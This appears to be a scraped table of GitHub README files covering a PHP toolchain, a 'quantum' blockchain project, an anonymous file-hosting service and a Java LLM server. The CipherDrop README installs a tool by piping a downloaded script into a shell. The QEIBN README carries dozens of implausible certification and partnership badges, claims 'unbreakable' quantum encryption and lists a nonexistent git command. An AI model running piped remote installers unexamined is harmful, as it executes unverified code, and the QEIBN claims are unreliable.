- **Features**: Simple 2D graphics rendering.

### Day 6: TUI Chat Application
- **Difficulty**: Advanced
- **Features**: Terminal-based chat with networking.

### Day 7: CHIP-8 Emulator
- **Difficulty**: Advanced
- **Features**: Emulation of CHIP-8 games.

## How to Use

Each project folder contains:

- **/src**: Source code
- **Cargo.toml**: Project dependencies
- **README.md**: Project-specific instructions

To run a project:
1. Navigate to the project directory:
   ```bash
   cd dayX_project_name",0,0,1,,,0.0
carthage-software/fennec,main,"# Fennec: The Oxidized PHP Toolchain

Fennec is a toolchain for PHP that aims to provide a set of tools to help developers write better code.
It is inspired by the Rust programming language and its toolchain, and aims to provide similar functionality for PHP.

## Disclaimer

> [!WARNING]
> Fennec is in an early stage of development. Many features are not yet implemented, and existing functionality may change, break, or stop working without notice.
> While we are not actively promoting or advertising the project, we are working in public to share our progress with the community.

## Roadmap

### Core Functionality

- [x] String Interning: [`crates/interner`](crates/interner)
- [x] Lexer: [`crates/lexer`](crates/lexer) [`crates/token`](crates/token)
- [x] AST: [`crates/ast`](crates/ast)
- [x] Parser: [`crates/parser`](crates/parser)
- [x] Source Management: [`crates/source`](crates/source)
- [x] AST Traversal / Walk: [`crates/traverser`](crates/traverser) [`crates/walker`](crates/walker)
- [x] Name Resolution: [`crates/names`](crates/names)
- [x] Code Fixer: [`crates/fixer`](crates/fixer)
- [x] Error Reporting: [`crates/reporting`](crates/reporting)
- [x] Semantic Analysis: [`crates/semantics`](crates/semantics)
- [x] Symbol Table: [`crates/symbol-table`](crates/symbol-table)
- [x] Linter: [`crates/linter`](crates/linter)
- [x] Services: [`crates/service`](crates/service)
- [x] String Case Conversion: [`crates/casing`](crates/casing)
- [x] Reflections: [`crates/reflection`](crates/reflection)
- [x] Reflector: [`crates/reflector`](crates/reflector), [`crates/scanner`](crates/scanner)
- [x] Type Inference: [`crates/inference`](crates/inference)
- [ ] Formatter
- [ ] Static Analyzer
- [ ] Refactoring
- [ ] Code Generation
- [ ] Documentation Generation
- [x] Docblock Parser [`crates/docblock`](crates/docblock)
- [ ] Test Runner

### Tooling

- [x] CLI Tool: [`crates/cli`](crates/cl)
- [ ] Web Interface
- [ ] Language Server Protocol
- [ ] Editor Integration

## Installation

```bash
cargo install --git https://github.com/carthage-software/fennec
```

## Installation from source

```bash
git clone https://github.com/carthage-software/fennec
cd fennec
cargo install --path .
```

## Usage

For a quick start, you can refer to the example configuration files provided:

- Simple configuration: [`examples/fennec.toml`](examples/fennec.toml)
- Full configuration with all possible options: [`examples/fennec-full.toml`](examples/fennec-full.toml)

You can try Fennec by navigating to the [`examples`](examples) directory and running the linter on the sample PHP files:

```bash
cd examples
fennec lint
```

This will analyze the PHP files located in the [`examples/src/`](examples/src) directory and display any linting errors.

## How You Can Help

Fennec is a community-driven project, and we‚Äôd love for you to join us! Here are some ways you can contribute:

- _Suggest Ideas_: Have an idea for Fennec? We‚Äôre open to suggestions that can make the toolchain even better!
- _Help Write Documentation_: Clear, user-friendly documentation is key to making Fennec accessible to everyone. If you enjoy writing or organizing docs, we'd love your help.
- _Contribute Code_: Join us in building Fennec! Please discuss any feature or bug fixes in the issues first to ensure we coordinate effectively.
- _Sponsor the Project_: If you‚Äôd like to support Fennec financially, consider sponsoring [@azjezz](https://github.com/azjezz). Every contribution helps!
- _Help with Art_: Fennec could use a logo! We‚Äôd appreciate the help of a skilled artist to create an original logo for Fennec. (Please note that AI-generated art will not be accepted.)

## Inspiration

Fennec is inspired by several tools and projects that have significantly contributed to the development community:

- [Clippy](https://github.com/rust-lang/rust-clippy): A collection of lints to catch common mistakes and improve your Rust code.
- [OXC](https://github.com/oxc-project/oxc/): A JavaScript toolchain written in Rust.
- [php-rust-tools/parser](https://github.com/php-rust-tools/parser/): A PHP parser written in Rust, which influenced our parsing approach.
- [slackhq/hakana](https://github.com/slackhq/hakana/): A static analysis tool for HackLang written in Rust, by the creator of [Psalm](https://github.com/vimeo/psalm).

These tools have inspired us and helped shape Fennec's design and functionality.

## Acknowledgements

We would like to acknowledge the following PHP tools that have greatly helped hundreds of thousands of PHP developers in their journey,
ourselves included:

- [PHP CS Fixer](https://github.com/PHP-CS-Fixer/PHP-CS-Fixer): A tool to automatically fix PHP Coding Standards issues.
- [Psalm](https://github.com/vimeo/psalm): A static analysis tool for finding errors in PHP applications.
- [PHPStan](https://github.com/phpstan/phpstan): PHP Static Analysis Tool.
- [PHP_CodeSniffer](https://github.com/squizlabs/PHP_CodeSniffer): Detects violations of a defined set of coding standards.

While Fennec is intended to be a comprehensive toolchain that may eventually replace some of these tools,
we deeply appreciate their contributions and the foundation they have built for the PHP community.

## License

Fennec is licensed under either of

- MIT License (MIT) - see [LICENSE-MIT](./LICENSE-MIT) file for details
- Apache License, Version 2.0 (Apache-2.0) - see [LICENSE-APACHE](./LICENSE-APACHE) file for details

at your option.

## Contribution

Unless you explicitly state otherwise, any contribution intentionally submitted for inclusion in Fennec by you shall be dual licensed as above, without any additional terms or conditions.

---

Thank you for your interest in Fennec. We look forward to sharing our progress and collaborating with the community as the project evolves.
",0,3,2,Apache-2.0,,4.0
KOSASIH/QEIBN,main,"![Static Badge](https://img.shields.io/badge/%F0%9F%8C%90-QEIBN-gold)

[![Apache License, Version 2.0](https://img.shields.io/badge/Apache%202.0-License-blue.svg)](https://www.apache.org/licenses/LICENSE-2.0)
[![MIT License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Open Source Initiative](https://img.shields.io/badge/Open%20Source-Approved-brightgreen.svg)](https://opensource.org/)
[![Python Package Index (PyPI)](https://img.shields.io/badge/PyPI-Available-blue.svg)](https://pypi.org/project/QEIBN/)
[![Docker Image](https://img.shields.io/badge/docker-ready-blue.svg)](https://hub.docker.com/r/kosasi/qeibn)
[![CII Best Practices](https://img.shields.io/badge/CII%20Best%20Practices-Approved-brightgreen.svg)](https://bestpractices.coreinfrastructure.org/en)
[![FOSSA Compliance](https://img.shields.io/badge/FOSSA-Compliant-brightgreen.svg)](https://fossa.com/)
[![Certified Kubernetes Administrator](https://img.shields.io/badge/CNCF-Certified_Kubernetes_Administrator-blue.svg)](https://www.cncf.io/certification/kubernetes/)
[![AWS Certified Solutions Architect](https://img.shields.io/badge/AWS-Certified_Solutions_Architect-FF9900.svg)](https://aws.amazon.com/certification/certified-solutions-architect-associate/)
[![Google Cloud Certified](https://img.shields.io/badge/Google%20Cloud-Certified-4285F4.svg)](https://cloud.google.com/certification/)
[![Microsoft Certified: Azure Solutions Architect Expert](https://img.shields.io/badge/Microsoft-Certified_Azure_Solutions_Architect_Expert-0078D4.svg)](https://docs.microsoft.com/en-us/learn/certifications/azure-solutions-architect/)
[![Certified Ethical Hacker](https://img.shields.io/badge/EC_Council-Certified_Ethical_Hacker-FF0000.svg)](https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/)
[![CompTIA Security+](https://img.shields.io/badge/CompTIA-Security%2B-FF7F50.svg)](https://www.comptia.org/certifications/security)
[![Certified Data Scientist](https://img.shields.io/badge/IBM-Certified_Data_Scientist-5C5C5C.svg)](https://www.ibm.com/certify/cert?id=50001301)
[![Certified Blockchain Expert](https://img.shields.io/badge/Blockchain_Council-Certified_Blockchain_Expert-orange.svg)](https://www.blockchain-council.org/certifications/certified-blockchain-expert/)
[![Certified ScrumMaster](https://img.shields.io/badge/Scrum%20Alliance-Certified_ScrumMaster-FFB300.svg)](https://www.scrumalliance.org/get-certified/scrum-master-track/certified-scrum-master)
[![Project Management Professional](https://img.shields.io/badge/PMI-Project_Management_Professional-0072B5.svg)](https://www.pmi.org/certifications/project-management-pmp)
[![Cisco Certified Network Associate](https://img.shields.io/badge/Cisco-Certified_Network_Associate-1BA0D7.svg)](https://www.cisco.com/c/en/us/training-events/training-certifications/certifications/associate/ccna.html)
[![Red Hat Certified Engineer](https://img.shields.io/badge/Red%20Hat-Certified_Engineer-CC0000.svg)](https://www.redhat.com/en/services/certification/rhce)
[![Certified Information Systems Security Professional](https://img.shields.io/badge/ISC%2B2-Certified_Information_Systems_Security_Professional-FFCC00.svg)](https://www.isc2.org/Certifications/CISSP)
[![Certified Information Security Manager](https://img.shields.io/badge/ISACA-Certified_Information_Security_Manager-0072C6.svg)](https://www.isaca.org/credentialing/cism)
[![Certified Information Systems Auditor](https://img.shields.io/badge/ISACA-Certified_Information_Systems_Auditor-0072C6.svg)](https://www.isaca.org/credentialing/cisa)
[![Google Analytics Individual Qualification](https://img.shields.io/badge/Google%20Analytics-Individual_Qualification-FF9900.svg)](https://analytics.google.com/analytics/academy/)
[![Certified Cloud Security Professional](https://img.shields.io/badge/ISC%2B2-Certified_Cloud_Security_Professional-FFCC00.svg)](https://www.isc2.org/Certifications/CCSP)
[![AWS Certified Developer](https://img.shields.io/badge/AWS-Certified_Developer-FF9900.svg)](https://aws.amazon.com/certification/certified-developer-associate/)
[![AWS Certified DevOps Engineer](https://img.shields.io/badge/AWS-Certified_DevOps_Engineer-FF9900.svg)](https://aws.amazon.com/certification/certified-devops-engineer-professional/)
[![Certified Data Privacy Solutions Engineer](https://img.shields.io/badge/ISACA-Certified_Data_Privacy_Solutions_Engineer-0072C6.svg)](https://www.isaca.org/credentialing/cdpp)
[![Certified Business Analysis Professional](https://img.shields.io/badge/IIBA-Certified_Business_Analysis_Professional-0072C6.svg)](https://www.iiba.org/certification/certified-business-analysis-professional/)
[![Certified Six Sigma Green Belt](https://img.shields.io/badge/ASQ-Certified_Six_Sigma_Green_Belt-0072C6.svg)](https://asq.org/cert/six-sigma-green-belt)
[![Certified Scrum Product Owner](https://img.shields.io/badge/Scrum%20Alliance-Certified_Scrum_Product_Owner-FFB300.svg)](https://www.scrumalliance.org/get-certified/product-owner-track/certified-scrum-product-owner)
[![Certified Ethical Hacker (CEH)](https://img.shields.io/badge/EC_Council-Certified_Ethical_Hacker-FF0000.svg)](https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/)
[![Certified Information Privacy Professional](https://img.shields.io/badge/IAPP-Certified_Information_Privacy_Professional-0072C6.svg)](https://iapp.org/certify/cipp/)
[![Certified Kubernetes Application Developer](https://img.shields.io/badge/CNCF-Certified_Kubernetes_Application_Developer-blue.svg)](https://www.cncf.io/certification/kubernetes/application-developer/)
[![Salesforce Certified Administrator](https://img.shields.io/badge/Salesforce-Certified_Administrator-00A1E0.svg)](https://trailhead.salesforce.com/credentials/administrator)
[![Salesforce Certified Developer](https://img.shields.io/badge/Salesforce-Certified_Developer-00A1E0.svg)](https://trailhead.salesforce.com/credentials/developer)
[![Certified Information Systems Risk Manager](https://img.shields.io/badge/ISACA-Certified_Information_Systems_Risk_Manager-0072C6.svg)](https://www.isaca.org/credentialing/cism)
[![Certified in Risk and Information Systems Control](https://img.shields.io/badge/ISACA-Certified_in_Risk_and_Information_Systems_Control-0072C6.svg)](https://www.isaca.org/credentialing/crisc)
[![Certified Blockchain Developer](https://img.shields.io/badge/Blockchain_Council-Certified_Blockchain_Developer-orange.svg)](https://www.blockchain-council.org/certifications/certified-blockchain-developer/)
[![Certified Digital Marketing Professional](https://img.shields.io/badge/Digital%20Marketing%20Institute-Certified_Digital_Marketing_Professional-0072C6.svg)](https://digitalmarketinginstitute.com/certification)
[![Certified Data Analyst](https://img.shields.io/badge/IBM-Certified_Data_Analyst-5C5C5C.svg)](https://www.ibm.com/certify/cert?id=50001302)
[![Certified Information Privacy Manager](https://img.shields.io/badge/IAPP-Certified_Information_Privacy_Manager-0072C6.svg)](https://iapp.org/certify/cipm/)
[![Certified Information Systems Security Professional (CISSP-ISSAP)](https://img.shields.io/badge/ISC%2B2-CISSP--ISSAP-FFCC00.svg)](https://www.isc2.org/Certifications/CISSP-ISSAP)
[![Certified Information Systems Security Professional (CISSP-ISSEP)](https://img.shields.io/badge/ISC%2B2-CISSP--ISSEP-FFCC00.svg)](https://www.isc2.org/Certifications/CISSP-ISSEP)
[![Certified Information Systems Security Professional (CISSP-ISSMP)](https://img.shields.io/badge/ISC%2B2-CISSP--ISSMP-FFCC00.svg)](https://www.isc2.org/Certifications/CISSP-ISSMP)
[![Certified in the Governance of Enterprise IT](https://img.shields.io/badge/ISACA-Certified_in_the_Governance_of_Enterprise_IT-0072C6.svg)](https://www.isaca.org/credentialing/cgeit)
[![Certified Cloud Security Professional (CCSP)](https://img.shields.io/badge/ISC%2B2-Certified_Cloud_Security_Professional-FFCC00.svg)](https://www.isc2.org/Certifications/CCSP)
[![Certified Scrum Master (CSM)](https://img.shields.io/badge/Scrum%20Alliance-Certified_Scrum_Master-FFB300.svg)](https://www.scrumalliance.org/get-certified/scrum-master-track/certified-scrum-master)
[![Certified Six Sigma Black Belt](https://img.shields.io/badge/ASQ-Certified_Six_Sigma_Black_Belt-0072C6.svg)](https://asq.org/cert/six-sigma-black-belt)
[![Certified Agile Leadership](https://img.shields.io/badge/Scrum%20Alliance-Certified_Agile_Leadership-FFB300.svg)](https://www.scrumalliance.org/get-certified/agile-leadership)
[![Certified Digital Transformation Officer](https://img.shields.io/badge/EXIN-Certified_Digital_Transformation_Officer-0072C6.svg)](https://www.exin.com/en/certifications/digital-transformation-officer/)
[![Certified Internet of Things Practitioner](https://img.shields.io/badge/CertNexus-Certified_Internet_of_Things_Practitioner-0072C6.svg)](https://certnexus.com/certifications/iot-practitioner/)
[![Certified Blockchain Business Foundations](https://img.shields.io/badge/Blockchain_Council-Certified_Blockchain_Business_Foundations-orange.svg)](https://www.blockchain-council.org/certifications/certified-blockchain-business-foundations/)
[![Certified Artificial Intelligence Practitioner](https://img.shields.io/badge/CertNexus-Certified_Artificial_Intelligence_Practitioner-0072C6.svg)](https://certnexus.com/certifications/ai-practitioner/)
[![Certified Ethical Hacker (CEH) Master](https://img.shields.io/badge/EC_Council-Certified_Ethical_Hacker_Master-FF0000.svg)](https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/)
[![Certified in Risk Management Assurance](https://img.shields.io/badge/ISACA-Certified_in_Risk_Management_Assurance-0072C6.svg)](https://www.isaca.org/credentialing/crma)
[![Certified Digital Marketing Specialist](https://img.shields.io/badge/Digital%20Marketing%20Institute-Certified_Digital_Marketing_Specialist-0072C6.svg)](https://digitalmarketinginstitute.com/certification)
[![Certified Information Systems Auditor (CISA)](https://img.shields.io/badge/ISACA-Certified_Information_Systems_Auditor-0072C6.svg)](https://www.isaca.org/credentialing/cisa)
[![Certified Information Security Manager (CISM)](https://img.shields.io/badge/ISACA-Certified_Information_Security_Manager-0072C6.svg)](https://www.isaca.org/credentialing/cism)
[![Certified in the Governance of Enterprise IT (CGEIT)](https://img.shields.io/badge/ISACA-Certified_in_the_Governance_of_Enterprise_IT-0072C6.svg)](https://www.isaca.org/credentialing/cgeit)

[![Open Source Initiative](https://img.shields.io/badge/Open%20Source-Initiative%20Approved-brightgreen)](https://opensource.org/)
[![CII Best Practices](https://img.shields.io/badge/CII%20Best%20Practices-Approved-brightgreen)](https://bestpractices.coreinfrastructure.org/en)
[![Linux Foundation](https://img.shields.io/badge/Linux%20Foundation-Project-blue)](https://www.linuxfoundation.org/)
[![Google Summer of Code](https://img.shields.io/badge/Google%20Summer%20of%20Code-Participant-orange)](https://summerofcode.withgoogle.com/)
[![GitHub Sponsors](https://img.shields.io/badge/GitHub-Sponsors-ff69b4)](https://github.com/sponsors)
[![Mozilla Open Source Support](https://img.shields.io/badge/Mozilla-Open%20Source%20Support-blue)](https://www.mozilla.org/en-US/moss/)
[![Apache Incubator](https://img.shields.io/badge/Apache-Incubator-brightgreen)](https://incubator.apache.org/)
[![CNCF](https://img.shields.io/badge/CNCF-Project-blue)](https://www.cncf.io/)
[![OpenAI Partnership](https://img.shields.io/badge/OpenAI-Partner-blue)](https://openai.com/)
[![IEEE](https://img.shields.io/badge/IEEE-Recognized-blue)](https://www.ieee.org/)
[![W3C Recommendation](https://img.shields.io/badge/W3C-Recommended-blue)](https://www.w3.org/)
[![ISO Certification](https://img.shields.io/badge/ISO-Certified-blue)](https://www.iso.org/)
[![NIST Compliance](https://img.shields.io/badge/NIST-Compliant-blue)](https://www.nist.gov/)
[![SANS Institute](https://img.shields.io/badge/SANS-Certified-orange)](https://www.sans.org/)
[![ACM](https://img.shields.io/badge/ACM-Recognized-blue)](https://www.acm.org/)
[![Microsoft Certified: Azure Fundamentals](https://img.shields.io/badge/Microsoft-Certified%3A%20Azure%20Fundamentals-0078D4.svg)](https://learn.microsoft.com/en-us/certifications/azure-fundamentals/)
[![Cisco Certified Network Associate](https://img.shields.io/badge/Cisco-Certified%20Network%20Associate-1BA0E0.svg)](https://www.cisco.com/c/en/us/training-events/training-certifications/certifications/associate/ccna.html)
[![CompTIA Security+](https://img.shields.io/badge/CompTIA-Security%2B-FF7F00.svg)](https://www.comptia.org/certifications/security)
[![Oracle Certified Professional](https://img.shields.io/badge/Oracle-Certified%20Professional-F80000.svg)](https://education.oracle.com/oracle-certified-professional/overview)
[![Red Hat Certified Engineer](https://img.shields.io/badge/Red%20Hat-Certified%20Engineer-CC0000.svg)](https://www.redhat.com/en/services/certification)
[![SAP Certified Technology Associate](https://img.shields.io/badge/SAP-Certified%20Technology%20Associate-0FA1E0.svg)](https://training.sap.com/certification/certified-technology-associate/)
[![Google Cloud Certified - Professional Cloud Architect](https://img.shields.io/badge/Google%20Cloud-Certified%20Professional%20Cloud%20Architect-4285F4.svg)](https://cloud.google.com/certification/cloud-architect)
[![IBM Certified Developer](https://img.shields.io/badge/IBM-Certified%20Developer-FFB300.svg)](https://www.ibm.com/certify/cert?id=08000101)
[![PMP Certification](https://img.shields.io/badge/PMP-Certified-0072B1.svg)](https://www.pmi.org/certifications/project-management-pmp)
[![Certified ScrumMaster](https://img.shields.io/badge/Certified%20ScrumMaster-CSM-FF6F20.svg)](https://www.scrumalliance.org/get-certified/scrum-master-track/certified-scrum-master)
[![ITIL Foundation](https://img.shields.io/badge/ITIL-Foundation-5B9BD5.svg)](https://www.axelos.com/certifications/itil)
[![TOGAF 9 Certified](https://img.shields.io/badge/TOGAF%209-Certified-0072B1.svg)](https://www.opengroup.org/togaf)
[![Certified Information Systems Security Professional (CISSP)](https://img.shields.io/badge/CISSP-Certified-FFB300.svg)](https://www.isc2.org/Certifications/CISSP)
[![Certified Kubernetes Administrator](https://img.shields.io/badge/CKA-Certified%20Kubernetes%20Administrator-326CE5.svg)](https://www.cncf.io/certification/cka/)
[![CompTIA Advanced Security Practitioner](https://img.shields.io/badge/CompTIA-Advanced_Security_Practitioner-FF7F50.svg)](https://www.comptia.org/certifications/advanced-security-practitioner)
[![Certified Information Security Manager](https://img.shields.io/badge/ISACA-Certified_Information_Security_Manager-0072C6.svg)](https://www.isaca.org/credentialing/cism)
[![Certified Information Systems Auditor](https://img.shields.io/badge/ISACA-Certified_Information_Systems_Auditor-0072C6.svg)](https://www.isaca.org/credentialing/cisa)
[![Certified in Risk and Information Systems Control](https://img.shields.io/badge/ISACA-Certified_in_Risk_and_Information_Systems_Control-0072C6.svg)](https://www.isaca.org/credentialing/crisc)
[![Certified in the Governance of Enterprise IT](https://img.shields.io/badge/ISACA-Certified_in_the_Governance_of_Enterprise_IT-0072C6.svg)](https://www.isaca.org/credentialing/cgeit)
[![Certified Blockchain Developer](https://img.shields.io/badge/Blockchain_Council-Certified_Blockchain_Developer-orange.svg)](https://www.blockchain-council.org/certifications/certified-blockchain-developer/)
[![Certified AI Engineer](https://img.shields.io/badge/AI%20Council-Certified_AI_Engineer-FFCC00.svg)](https://www.aicouncil.org/certifications/certified-ai-engineer/)
[![Certified Data Analyst](https://img.shields.io/badge/IBM-Certified_Data_Analyst-5C5C5C.svg)](https://www.ibm.com/certify/cert?id=50001302)
[![Certified Machine Learning Engineer](https://img.shields.io/badge/IBM-Certified_Machine_Learning_Engineer-5C5C5C.svg)](https://www.ibm.com/certify/cert?id=50001303)

<p xmlns:cc=""http://creativecommons.org/ns#"" xmlns:dct=""http://purl.org/dc/terms/""><a property=""dct:title"" rel=""cc:attributionURL"" href=""https://github.com/KOSASIH/QEIBN"">QEIBN ( Quantum Entangled Inter-Blockchain Network ) </a> by <a rel=""cc:attributionURL dct:creator"" property=""cc:attributionName"" href=""https://www.linkedin.com/in/kosasih-81b46b5a"">KOSASIH</a> is licensed under <a href=""https://creativecommons.org/licenses/by/4.0/?ref=chooser-v1"" target=""_blank"" rel=""license noopener noreferrer"" style=""display:inline-block;"">Creative Commons Attribution 4.0 International<img style=""height:22px!important;margin-left:3px;vertical-align:text-bottom;"" src=""https://mirrors.creativecommons.org/presskit/icons/cc.svg?ref=chooser-v1"" alt=""""><img style=""height:22px!important;margin-left:3px;vertical-align:text-bottom;"" src=""https://mirrors.creativecommons.org/presskit/icons/by.svg?ref=chooser-v1"" alt=""""></a></p>

# QEIBN
Quantum Entangled Inter-Blockchain Network: The future of decentralized systems. 

# Quantum Entangled Inter-Blockchain Network (QEIBN)

## The Future of Decentralized Systems

QEIBN is a revolutionary decentralized system that leverages the power of quantum entanglement to enable secure, scalable, and efficient communication between blockchain networks.

## Overview

QEIBN is a decentralized network that enables the creation of a network of interconnected blockchain networks, allowing for seamless communication and data exchange between them. The network is secured using quantum entanglement-based cryptography, ensuring the confidentiality, integrity, and authenticity of data transmitted between networks.

## Features

* **Quantum Entanglement-based Cryptography**: QEIBN uses quantum entanglement to create unbreakable encryption keys, ensuring the security of data transmitted between networks.
* **Inter-Blockchain Communication**: QEIBN enables seamless communication between blockchain networks, allowing for the creation of a network of interconnected networks.
* **Scalability**: QEIBN is designed to scale horizontally, allowing for the addition of new networks and nodes as needed.
* **Efficiency**: QEIBN uses advanced algorithms and data structures to optimize data transmission and processing, reducing latency and increasing throughput.

## Architecture

QEIBN consists of the following components:

* **Entanglement Simulator**: A software component that simulates the behavior of quantum entanglement, allowing for the creation of entangled particles.
* **AI Model Trainer**: A software component that trains machine learning models to optimize data transmission and processing.
* **IBC Node**: A software component that enables communication between blockchain networks.

## Getting Started

To get started with QEIBN, follow these steps:

1. Clone the repository: `git clone https://github.com/KOSASIH/QEIBN.git`
2. Build the project: `./scripts/build.sh`
3. Deploy the project: `./scripts/deploy.sh`

## Contributing

Contributions to QEIBN are welcome! To contribute, follow these steps:

1. Fork the repository: `git fork https://github.com/KOSASIH/QEIBN.git`
2. Create a new branch: `git branch my-feature`
3. Make changes: `git add .`
4. Commit changes: `git commit -m ""My feature""`
5. Push changes: `git push origin my-feature`
6. Create a pull request: `git pull-request`

## License

QEIBN is licensed under the Apache License, Version 2.0.

## Acknowledgments

QEIBN is a collaborative project between researchers and developers from around the world. We would like to acknowledge the contributions of the following individuals and organizations:

* All contributors and organizations
  
",0,0,2,Apache-2.0,,1.0
Hattorius/CipherDrop,main,"# Cipher Drop

Goal: Create an anonymous file hosting service.

Available at
- https://cipherdrop.sh
- http://7li2aq2wefmr7ypllk36qyf2ueagvywurhvvmpafadmkgidmgyftetqd.onion

## Features
- Encrypt file on client
- Private key & nonce never leave client machine
- Bytes also get encrypted on the server
- Double encrypted bytes can be saved on any s3

The idea behind this project is to make the file hosting as anonymous as possible. If / when this gets put online it'll have zero logs and you can only see file contents when authorized by the original file uploader.

# How to setup
Make sure you have [docker](https://docs.docker.com/engine/install/) installed.
```
docker compose up
```
Yeah, that's really it. It should now pull the Postgresql image & build the webserver. You should still [setup Diesel & run the migrations](https://github.com/Hattorius/CipherDrop?tab=readme-ov-file#diesel-setup) though!

## Adding s3 buckets
To add your s3 bucket to the database you'll need to attach to the postgres service in docker. First figure out what the postgres container name is:
```
> $ docker ps
CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS         PORTS                    NAMES
de605f0e7c17   cipherdrop-backend   ""backend sh -c ' unt‚Ä¶""   9 minutes ago   Up 3 seconds   0.0.0.0:8080->8080/tcp   cipherdrop
1333910cccd8   postgres:latest      ""docker-entrypoint.s‚Ä¶""   9 minutes ago   Up 3 seconds   5432/tcp                 postgres_container
```
This usually is `postgres_container`, but just make sure by checking.

Now run the following command to attach to the container:
```shell
docker exec -it postgres_container psql -U root -d db
```
You can replace `postgres_container` with the name of your postgres container. While being attacked to the container you can run any SQL query. The query to insert a s3 bucket is the following:

```sql
INSERT INTO s3_buckets (bucket_name, region, endpoint, access_key, secret_key)
VALUES ('NAME', 'REGION', 'ENDPOINT', 'ACCESS_KEY', 'SECRET_KEY')
```
With the following example bucket link: `my_bucket.fsn1.your-objectstorage.com` (Hetzner):  
`NAME`: `my_bucket.fsn1`,  
`REGION`: `fsn1`,  
`ENDPOINT`: `your-objectstorage.com`,  
`ACCESS_KEY`: your access key,  
`SECRET_KEY`: your secret key

Why the `NAME` also contains the region? No idea, it's just [how the package I used works.](https://github.com/durch/rust-s3/blob/7c6fdc0646704eac315c11eb60bf9f125975159b/s3/src/bucket.rs#L2548)

# Development setup

This is actually pretty simple, you just have to make sure you have Docker [installed](https://docs.docker.com/desktop/) & running, and run the following command to start a Postgres instance:
```shell
docker compose -f compose-dev.yml up
```

After this you need to copy the [`env.example`](https://github.com/Hattorius/CipherDrop/blob/main/backend/.env) into `.env` in the `backend` folder and change the `DATABASE_URL` value to your database connection string. (which should be `postgres://root:toor@localhost/db`)

## Diesel setup

Make sure to install the [Diesel](https://diesel.rs/guides/getting-started) cli. These are the commands I quickly copied over, but make sure to check if they're not outdated:
```shell
# Linux/MacOS
curl --proto '=https' --tlsv1.2 -LsSf https://github.com/diesel-rs/diesel/releases/latest/download/diesel_cli-installer.sh | sh

# Windows
powershell -c ""irm https://github.com/diesel-rs/diesel/releases/latest/download/diesel_cli-installer.ps1 | iex""
```  

Run the database migrations using diesel:
```shell
diesel migration run
```  

## Start

Now finally start the server with hot reload:
```shell
cargo watch -w src -w ../frontend -x run
```

# Thank you for reading
",1,5,3,MIT,"deploy.yml,test.yml",8.0
stephanj/Llama3JavaChatCompletionService,master,"# Llama3.java Inference with OpenAI Chat Completion REST API ‚òïÔ∏è

This project provides a REST API wrapper for the amazing [Llama3.java project](https://github.com/mukel/llama3.java) from Alfonso¬≤ Peterssen. 
The wrapper is compliant with the OpenAI API specification for chat completions.

## ToDo 

- [X] SpringBoot wrapper around Llama3.java
- [X] Create Java Flame graph to see where performance issue's are located (matmul üî•)
- [ ] Optional: Quarkus wrapper around Llama3.java
- [ ] TornadoVM enabled version
- [ ] GraalVM native version
- [ ] LLM Sharding (Layers, Attn Head)
- [ ] BitNets support 
- [ ] Ternary Models support

## On Apple Silicon (M1/M2/M3)

Make sure to download an ARM compliant SDK, for example from https://bell-sw.com/pages/downloads/#jdk-21-lts 

https://github.com/user-attachments/assets/6fecb9c1-6c84-4a01-a63b-272e75009618

## Setup

Set the JAVA_HOME environment variable to the ARM SDK path. 

Example with Zulu JDK 23 (zulu23.30.13-ca-jdk23.0.1-macosx_aarch64)

```bash
export JAVA_HOME=/Library/Java/JavaVirtualMachines/zulu-23.jdk/Contents/Home
```

IMPORTANT: Do not use SDKMan because this will fall back to the x86 version of the SDK.

## Build 

```bash
mvn clean package
```

## Download LLM

Download a GGUF model from the Hugging Face model hub and place it in the 'models' directory. 
For example:

```bash
mkdir models 
cd models
curl https://huggingface.co/hugging-quants/Llama-3.2-1B-Instruct-Q8_0-GGUF/blob/main/llama-3.2-1b-instruct-q8_0.gguf
```

Update the 'llama.model.name' variable in the application.properties file if you use a different model.

```application.properties
spring.application.name=Llama3.java Server
server.servlet.context-path=/

llama.model.path=models
llama.model.name=Meta-Llama-3.2-1b-instruct-Q8_0.gguf

logging.level.com.llama4j=INFO

server.address=localhost
server.port=8080
```

## Run 

Start the Spring Boot app which holds the Llama3.java REST wrapper as follows:

```bash
java --add-modules jdk.incubator.vector --enable-preview -jar target/llama3-server-1.0.0-SNAPSHOT.jar
```

or use the run.sh script which sets some extra JVM GC and Heap settings

```bash
./run.sh
```

## Test using Curl

```bash
curl -X POST http://localhost:8080/chat/completions \
-H ""Content-Type: application/json"" \
-d '{
  ""messages"": [
    {
      ""role"": ""system"",
      ""content"": ""You are a comedian.""
    },
    {
      ""role"": ""user"",
      ""content"": ""Tell me a joke.""
    }
  ],
  ""temperature"": 0.7,
  ""top_p"": 0.95,
  ""max_tokens"": 100
}'
```

Response

```json
{
   ""id"":""chatcmpl-1"",
   ""object"":""chat.completion"",
   ""created"":1729447400,
   ""model"":""Meta-Llama-3.2-1b-instruct-Q8_0.gguf"",
   ""systemFingerprint"":""fp_178ce5010c913"",
   ""choices"":[
      {
         ""index"":0,
         ""message"":{
            ""role"":""assistant"",
            ""content"":""A man walked into a library and asked the librarian, \""Do you have any books on Pavlov's dogs and Schr√∂dinger's cat?\"" The librarian replied, \""It rings a bell, but I'm not sure if it's here or not.\""""
         },
         ""logprobs"":null,
         ""finishReason"":""stop""
      }
   ],
   ""usage"":{
      ""promptTokens"":25,
      ""completionTokens"":53,
      ""totalTokens"":78,
      ""completionTokensDetails"":{
         ""reasoningTokens"":0
      }
   }
```

## Test using DevoxxGenie 

Launch any JetBrains IDE (such as IDEA, CLion, WebStorm, etc.) and install '[DevoxxGenie](https://plugins.jetbrains.com/plugin/24169-devoxxgenie)' from the Plugins marketplace. 
You can then choose either 'Jlama (Experimental)' or 'Exo (Experimental)', both of which utilize OpenAI's Chat Completion.

Next, enter a prompt and optionally attach files to the window context by using the 'Add File' icon located below the prompt text area.

Example with file attachment in prompt context:

![Demo2](https://github.com/user-attachments/assets/cbd8af2e-d3bd-4d9a-bdf5-0c2bc033915f)

## Baseline Performance Stats

Running on Apple M1 Max with 64Gb (LPDDR5) of RAM (32 number of Cores).  

![CallTree](https://github.com/user-attachments/assets/75e739e2-44b9-4e2b-a077-63021cb9ea39)

### Key Findings by ChatGPT

This profiling trace shows a CPU-heavy Java application, likely dealing with machine learning or vectorized computation. Here's a breakdown of key components:

